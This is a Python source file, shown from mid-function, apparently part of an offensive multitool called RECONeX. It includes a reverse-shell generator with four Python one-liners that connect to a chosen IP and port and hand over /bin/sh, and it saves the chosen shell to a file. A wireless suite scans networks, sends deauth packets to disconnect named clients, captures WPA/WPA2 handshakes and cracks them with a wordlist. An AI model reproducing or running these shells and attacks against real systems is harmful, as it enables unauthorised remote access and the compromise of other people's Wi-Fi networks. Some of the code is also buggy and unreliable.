        print("""(A)python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
(B)python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
(C)python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
(D)python -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'""")
        while True:
            lhost = input("Please enter the ip address to listen from(e.g. 0.0.0.0.) :-")
            try:
                ip_address_obj = ipaddress.ip_address(lhost)
                print("Valid IP address")
                break
            except:
                print("Invalid IP address")

        lport = input("Please enter the listener port(from 0-65536):-")
        pythonshellchoice = input("Use shell no.>\t")
        if pythonshellchoice == '1':
            shell = ("""python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'""" % (lhost , lport) )
            outputFile = input("Enter Shell file Name:-")
            with open(outputFile + '.py', 'w') as f:
                f.write(''.join(shell))
            print('Reverse shell is generated as %s.py' % outputFile)

        elif pythonshellchoice == '2':
            shell = ("""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'""" % ( lhost, lport))
            outputFile = input("Enter Shell file Name:-")
            with open(outputFile + '.py', 'w') as f:
                f.write(''.join(shell))
            print('Reverse shell is generated as %s.py' % outputFile)

        elif pythonshellchoice == '3':
            shell = ("""python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'""" % (lhost, lport))
            outputFile = input("Enter Shell file Name:-")
            with open(outputFile + '.py', 'w') as f:
                f.write(''.join(shell))
            print('Reverse shell is generated as %s.py' % outputFile)

        elif pythonshellchoice == '4':
            shell = ("""python -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'""" % (lhost, lport))
            outputFile = input("Enter Shell file Name:-")
            with open(outputFile + '.py', 'w') as f:
                f.write(''.join(shell))
            print('Reverse shell is generated as %s.py' % outputFile)

        else:
            print("These are the only available shell scripts")
            pythonshell()

        choice = input("Want to Continue? (y/n/exit):\t ")
        if choice == 'y':
            pythonshell()
        elif choice == 'n':
            ExploitOperation()
        elif choice == 'exit':
            grandoperation()
        else:
            print("Enter either y or n")

    except KeyboardInterrupt:
        print("\n")
        print("\nCtrl + C pressed............. Quitting. ")
    except KeyboardInterrupt:
        ExploitOperation()


def ExploitOperation():
    os.system("clear")
    f = Figlet(font='slant', width=200)
    print(colored(f.renderText('RECONeX'), 'green'))
    print('----------------------------------------------------')
    print('| A MULTITOOL FOR INFO. GATHERING , EXPLOITATION & |')
    print('|                Man In The Middle                 |')
    print('----------------------------------------------------\n')
    print('\t\t\t\t\t\tAuthor -  MANAV SHARMA\n')
    time.sleep(2)
    print("---------------------------------------")
    print('|           Modules Present           |')
    print("---------------------------------------")
    print(colored("|  1. Custom Password Generator       |", 'green'))
    print(colored("|  2. Custom Reverse Shell Generator  |", 'green'))
    print(colored("|  3. Exit from the Module            |", 'green'))
    print("---------------------------------------")
    try:
        choice = input("WKG >>")
        if choice == '1':
            print("You Choose Password production")
            keygen()
        elif choice == '2':
            print("You choose Reverse Shell production")
            time.sleep(2)
            print("Setting Up elements...")
            revgen()
        elif choice == '3':
            print("Exiting The tool.......")
            time.sleep(2)
            grandoperation()
        elif choice == 'clear':
            os.system('clear')
            ExploitOperation()
        elif choice == 'ifconfig':
            os.system("ifconfig")
            time.sleep(5)
            ExploitOperation()
        elif choice == 'ls':
            os.system("ls")
            time.sleep(5)
            ExploitOperation()
        elif choice == 'pwd':
            os.system("pwd")
            time.sleep(5)
            ExploitOperation()
        elif choice == 'iwconfig':
            os.system("iwconfig")
            time.sleep(5)
            ExploitOperation()
        elif choice == 'pwd':
            os.system('pwd')
            ExploitOperation()
        elif choice == 'ls':
            os.system('ls')
            ExploitOperation()
        elif choice == 'ifconfig':
            os.system('ifconfig')
            ExploitOperation()
        else:
            print("Enter Valid Choice")
            ExploitOperation()

    except KeyboardInterrupt:
        time.sleep(2)
        print("\nCtrl + C pressed.............Exiting")
        time.sleep(2)
        print("[+] Process Terminated.........")

############################################END OF EXPLOITATION SUITE#######################################################

#############################################START OF WIRELESS SUITE##############################################################

def interface_scan():
    wlan_pattern = re.compile("^wlan[0-9]+")
    check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())

    if len(check_wifi_result) == 0:
        print("Please connect a WiFi adapter and try again.")
        wirelessexp()

    print("Available Interfaces:")
    for index, item in enumerate(check_wifi_result):
        print(f"{index} - {item}")
        time.sleep(2)
        wirelessexp()

def interface_configure():
    try:
        print("\n [*] --> Updating your system, please wait ....  \n")
        lines()
        subprocess.call(['sudo','apt', 'update', '-y'], stdout=subprocess.DEVNULL)
        lines()

        print("\n [*] --> Installing build-essentials, Please wait ....  \n")
        lines()
        subprocess.call(['sudo','apt', 'install', 'build-essential', '-y'], stdout=subprocess.DEVNULL)
        lines()
        print("\n [*] --> Installing bc, Won't take too long :) ....  \n")
        lines()
        subprocess.call(['sudo','apt', 'install', 'bc', '-y'], stdout=subprocess.DEVNULL)
        lines()
        print("\n [*] --> Installing libelf-dev, Please wait ....  \n")
        lines()
        subprocess.call(['sudo','apt', 'install', 'libelf-dev', '-y'], stdout=subprocess.DEVNULL)
        lines()
        print("\n [*] --> Installing the required linux-headers, Please wait .....  \n")
        lines()
        subprocess.call(" sudo apt install linux-headers-$(uname -r)", shell=True)
        lines()
        print("\n [*] --> Removing \"r8188eu.ko module\"  \n")
        subprocess.call(['sudo','rmmod', 'r8188eu.ko'], stdout=subprocess.DEVNULL)
        print("\n [*] --> Git cloning \"rtl8188eus\"  \n")
        lines()
        unamer = subprocess.check_output(['uname','-r'])
        unamerr = re.search(r"\d.\d\d", str(unamer))
        if unamerr is None:
            subprocess.call(['sudo','git', 'clone', 'https://github.com/aircrack-ng/rtl8188eus'], stdout=subprocess.DEVNULL)
        elif unamerr.group(0) >= "5.15":
            subprocess.call(['sudo','git', 'clone', 'https://github.com/drygdryg/rtl8188eus.git'], stdout=subprocess.DEVNULL)
        else:
            subprocess.call(['sudo','git', 'clone', 'https://github.com/aircrack-ng/rtl8188eus'], stdout=subprocess.DEVNULL)
        lines()
        print("\n [*] --> Installing dkms, please wait ..... ")
        print(" [Info] --> If dkms installation timed out after 30 seconds, the tool would exit with error and you need to upgrade your Kali with the \"sudo apt upgrade -y\" CL \n")
        subprocess.call(['sudo','apt', 'install', 'dkms'], stdout=subprocess.DEVNULL, timeout=30)
        lines()
        print("\n [*] --> Done installing dkms. proceeding further ....  \n")
        os.chdir("rtl8188eus")
        lines()
        print("\n [*] --> Echoing \"blacklist r8188eu.ko\" to \"realtek.conf\"  \n")
        subprocess.call("sudo echo \"blacklist r8188eu.ko\" > \"/etc/modprobe.d/realtek.conf\"", shell=True)
        subprocess.call("sudo echo \"blacklist 8188eu.ko\" > \"/etc/modprobe.d/realtek.conf\"", shell=True)
        lines()
        print("\n [*] --> Running Make command, Will take few minutes, please wait and ignore the upcoming errors and warnings ......  \n")
        lines()
        subprocess.call(['sudo','make'], stdout=subprocess.DEVNULL)
        lines()
        print("\n [*] --> Running Make Install command  \n")
        lines()
        subprocess.call(['sudo','make', 'install'], stdout=subprocess.DEVNULL)
        lines()
        print("\n [*] --> Running \"modprobe 8188eu\"  \n")
        lines()
        subprocess.call("sudo modprobe 8188eu", shell=True)
        iwco = subprocess.check_output(['iwconfig'])
        Auto_check = re.search(r"Mode:Auto", str(iwco))
        if not Auto_check:
            lines()
            print("\n [Warning] --> The WiFi adapter mode is not Auto or it is just missing. ")
            print(" [Instruction] --> UnPlug and plug in your WiFi USB adapter, wait for few seconds then run the tool again with root - Bye bye :)   \n")
            lines()
            wirelessexp()
        if Auto_check is not None:
            lines()
            print("\n [Congrats] --> The WiFi USB adapter is successfully configured \n")
            asking = input("\n [Permission] --> Would you like to set your WiFi USB adapter to Monitor mode now?  [yes / no] ")
            lines()
            if asking.lower() == 'y' or asking.lower() == 'yes':
                enable_monitor()
            elif asking.lower() == 'n' or asking.lower() == 'no':
                lines()
                print("\n [Info] --> Now your adapter is just set to Auto mode - Bye Bye :) \n")
                TheEnd()
            else:
                lines()
                print("\n [Warning] --> Invalid Entry. [Your interface is just set to Auto mode] - Exiting .....\n")
                wirelessexp()

    except KeyboardInterrupt:
        print("Ctrl+C pressed......")
        wirelessexp()

def lines():
    print("-------------------------------------------------------------------------------------------------------")

def getinterf():
    interfs = subprocess.getoutput('iwconfig |grep WIFI@REALTEK')
    interf = re.search(r"\w\w\w\w\d", str(interfs))
    interff = re.search(r"\w\w\w\d", str(interfs))
    enforc = re.search(r"WIFI@REALTEK", str(interfs))
    if interf and enforc:
        return interf.group(0)
    elif interff and enforc:
        return interff.group(0)
    else:
        lines()
        print(" [Warning] --> Couldn't read your adapter, please make sure that your adapter is plugged in - Exiting .......")

def enable_monitor():
    interf = getinterf()
    subprocess.call(['sudo','ifconfig', interf, 'down'])
    subprocess.call("sudo airmon-ng check kill", shell=True)
    subprocess.call(['sudo','iwconfig', interf, 'mode', 'monitor'])
    subprocess.call(['sudo','ifconfig', interf, 'up'])
    interff = getinterf()
    iwcon = subprocess.getoutput("iwconfig"+interff)
    iwcon_Mcheck = re.search(r"Monitor",str(iwcon))
    if iwcon_Mcheck is not None:
        lines()
        print("\n [Congrats] --> You WiFi USB adapter has been set to monitor mode :) :) \n")
        wirelessexp()

ifconfig_outp = subprocess.getoutput("iwconfig")
interfs = subprocess.getoutput('iwconfig |grep WIFI@REALTEK')
chwlannn = re.search(r"Mode:Monitor", str(ifconfig_outp))
chwlan = re.search(r"Mode:Managed", str(ifconfig_outp))
chwlann = re.search(r"Mode:Auto", str(ifconfig_outp))
chifasso = re.search(r"unassociated", str(ifconfig_outp))

def airodump():
    print("*************************")
    print("*  Scan Wi-Fi Networks  *")
    print("*************************")
    if interfs and chwlannn:
        interfaceadapter = input(colored("## Enter your choice:-", 'yellow'))
        try:
            if interfaceadapter == 'wlan0':
                os.system("sudo airodump-ng" + "\t" + interfaceadapter)
                airodump_again()
            elif interfaceadapter == '':
                print("\n")
                print(colored("\tNull Value Detected!!!", 'blue'))
                print("\n")
                airodump()
            else:
                print("Enter from available WLAN interfaces")

        except KeyboardInterrupt:
            print("Process Aborted!!!!")
            airodump_again()

    elif interfs and chwlan :
        print("\nTP-Link adapter is in Managed Mode")
        print("\n Enable Monitor Mode TO sniff wifi networks")
        time.sleep(3)
        wirelessexp()
    elif interfs and chwlann :
        print("\nTP-Link adapter is in Auto Mode")
        print("\n Enable Monitor Mode TO sniff wifi networks")
        time.sleep(3)
        wirelessexp()
    elif interfs:
        print("\n Please enable Monitor Mode")
        time.sleep(3)
        wirelessexp()
    else:
        print("\n Didn't detect any WLAN adapter")
        print("\n\n Please Connect your WLAN adapter for WI-FI Sniffing.")
        wirelessexp()

def airodump_again():
    choice = input("Need Another Scan(y/n):- ")
    if choice == 'y':
        airodump()
    elif choice == 'n':
        print("Sniffing Terminated.......")
        time.sleep(2)
        wirelessexp()
    else:
        print("Enter y or n:--")
        airodump_again()

def aireplay():
    print("***********************************")
    print("*  Capture HandShakes (WPA/WPA2)  *")
    print("***********************************")
    if interfs and chwlannn:
        try:
            AP_mac_address = input(colored("## Enter access point's MAC address:-", 'yellow'))
            target_mac_address = input(colored("## Enter target's MAC address:-", 'yellow'))
            interfaceadapter = input(colored("## Enter adapter name:-", 'yellow'))
            no_of_deauth_packets = int(input(colored("## Enter no. of deauth packets:-", 'yellow')))
            if interfaceadapter == 'wlan0':
                os.system("sudo aireplay-ng  --deauth " + no_of_deauth_packets + "-a" + AP_mac_address +"-c " + target_mac_address + "\t" + interfaceadapter)
                lines()
                aireplay_again()
            elif interfaceadapter == '':
                print("\n")
                print(colored("\tNull Value Detected!!!", 'blue'))
                print("\n")
                aireplay()
            else:
                print("Enter from available WLAN interfaces")

        except KeyboardInterrupt:
                aireplay_again()

    elif interfs and chwlan:
        print("\nTP-Link adapter is in Managed Mode")
        print("\n Enable MOnitor mode for deauth attack")
        time.sleep(2)
        wirelessexp()
    elif interfs and chwlann:
        print("\nTP-Link adapter is in Auto Mode")
        print("\n Enable MOnitor mode for deauth attack")
        time.sleep(2)
        wirelessexp()
    elif interfs:
        print("\n Print enable Monitor Mode")
        wirelessexp()
    else:
        print("\n Didn't detect any WLAN adapter")
        print("\n Please Connect your WLAN adapter for WI-FI cracking.")

def aireplay_again():
    choice = input("Want to capture another handshake(y/n):- ")
    if choice == 'y':
        aireplay()
    elif choice == 'n':
        wirelessexp()
    else:
        print("Enter y or n:--")
        aireplay_again()
def lines():
    print("***************************************************************************")
    print("\n")

def aircrack():
    print("***********************************")
    print("*   Crack Passwords (WPA/WPA2)    *")
    print("***********************************")
    wpawpa2()

def wpawpa2():
    wordlist_for_cracking = input("Enter The path of wordlist:-\t ")
    capture_handshake_file = input("Enter the path of captured handshake file:-\t")
    checkfile = subprocess.getoutput('ls |grep' + capture_handshake_file)
    time.sleep(2)
    print("Sequencing the values.....")
    time.sleep(2)
    try:
        if checkfile:
            os.system("sudo aircrack-ng " + "\t" + "-w" + "\t" + wordlist_for_cracking + "\t" + capture_handshake_file)
            wpa_scan_again()
        else:
            print("Given handshake file not exist!! Check again")
            wpa()

    except KeyboardInterrupt:
        print("Ctrl + C pressed.....")
        exit()
def wpa_scan_again():
    choice = input("Need Another crack session(y/n):- ")
    if choice == 'y':
        wpawpa2()
    elif choice == 'n':
        print("process Terminated.......")
        wirelessexp()
    else:
        print("Enter y or n:--")
        wpa_scan_again()
def wirelessexp():
    os.system("clear")
    f = Figlet(font='slant', width=200)
    print(colored(f.renderText('RECONeX'), 'green'))
    print('----------------------------------------------------')
    print('| A MULTITOOL FOR INFO. GATHERING , EXPLOITATION & |')
    print('|                Man In The Middle                 |')
    print('----------------------------------------------------\n')
    print('\t\t\t\t\t\tAuthor -  MANAV SHARMA\n')
    print(colored(' Suggested :- Use Multiple terminals to use M.I.T.M. Tools', 'yellow'))
    time.sleep(2)
    choose = 0
    while (choose != '5'):
        print(colored("[HIGHLY RECOMMENDED ------> USe Multiple Terminals to Capture WPA/WPA2 HANDSHAKES ]", 'green'))
        time.sleep(1)
        print("-----------------------------------------------------")
        print("|             Wireless Exploitation Menu            |")
        print("-----------------------------------------------------")
        print("{1} Available Interfaces                            |")
        print("{2} Configure the interface (Only supports TP-LInk) |")
        print("{3} Enable Monitor Mode                             |")
        print("{4} Sniff Wi-Fi Signals Neaby                       |")
        print("{5} Deauth & Capture WPA/WPA2 handshakes            |")
        print("{6} Crack WPA/WPA2 Passwords                        |")
        print("{7} Exit from Attack Mode                           |")
        print("-----------------------------------------------------")
        choose = input("Enter your choice:-")
        if choose == '1':
            interface_scan()
        elif choose == '2':
            interface_configure()
        elif choose == '3':
            enable_monitor()
        elif choose == '4':
            airodump()
        elif choose == '5':
            aireplay()
        elif choose == '6':
            aircrack()
        elif choose == 'iwconfig':
            os.system("iwconfig")
            time.sleep(3)
            wirelessexp()
        elif choose == 'ifconfig':
            os.system("ifconfig")
            time.sleep(5)
            wirelessexp()
        elif choose == 'clear' :
            os.system("clear")
            time.sleep(2)
            wirelessexp()
        elif choose == 'ls':
            os.system("ls")
            time.sleep(5)
            wirelessexp()
        elif choose == 'pwd':
            os.system("pwd")
            time.sleep(5)
            wirelessexp()
        elif choose == '7':
            print(colored("Wireless Attack [MODE OFF]", 'green'))
            os.system("sudo service NetworkManager restart")
            MITMoperation()
        else:
            print("Enter Valid Input")
            wirelessexp()

############################################END OF WIRELESS SUITE#################################################################




def grandoperation():
    os.system("clear")
    f = Figlet(font='slant' , width = 200)
    print(colored(f.renderText('RECONeX'), 'green'))
    print('----------------------------------------------------')
    print('| A MULTITOOL FOR INFO. GATHERING , EXPLOITATION & |')
    print('|                Man In The Middle                 |')
    print('----------------------------------------------------\n')
    print('\t\t\t\t\t\tAuthor -  MANAV SHARMA\n')
    time.sleep(2)
    print("------------------------------")
    print('|        Modes Present        |')
    print("------------------------------")
    print(colored("|  1. Information Gathering  |", 'green'))
    print(colored("|  2. Man In The Middle      |", 'green'))
    print(colored("|  3. Exploitation Mode      |", 'green'))
    print(colored("|  4. Exit from the Suite    |", 'green'))
    print("------------------------------")
    try:
        choice = input("RECONeX>>\t")
        if choice == '1':
            print("You Choose Information Gathering")
            time.sleep(2)
            print("Wait for a moment")
            time.sleep(3)
            print(colored("Information Gathering [MODE ON]", 'yellow'))
            IGoperation()
        elif choice == '2':
            print("You choice Man in The Middle Mode")
            time.sleep(2)
            print("Establishing attacking Environment")
            subprocess.call(["service" , "apache2" , "start"])
            time.sleep(2)
            print(colored("Man in the Middle Attack [MODE ON]", 'red'))
            MITMoperation()
        elif choice == '3':
            print("You choice Exploitation Mode")
            time.sleep(2)
            print(colored("Exploitation [MODE ON]", 'blue'))
            time.sleep(2)
            ExploitOperation()

        elif choice == '4':
            print("Exiting The RECONeX Suite.......")
            time.sleep(2)
            exit()
        else:
            print("Enter Valid Choice")
            grandoperation()

    except KeyboardInterrupt:
        time.sleep(2)
        print("\nCtrl + C pressed.............Exiting")
        time.sleep(2)
        print("[+] RECONeX  Terminated.........")



grandoperation()

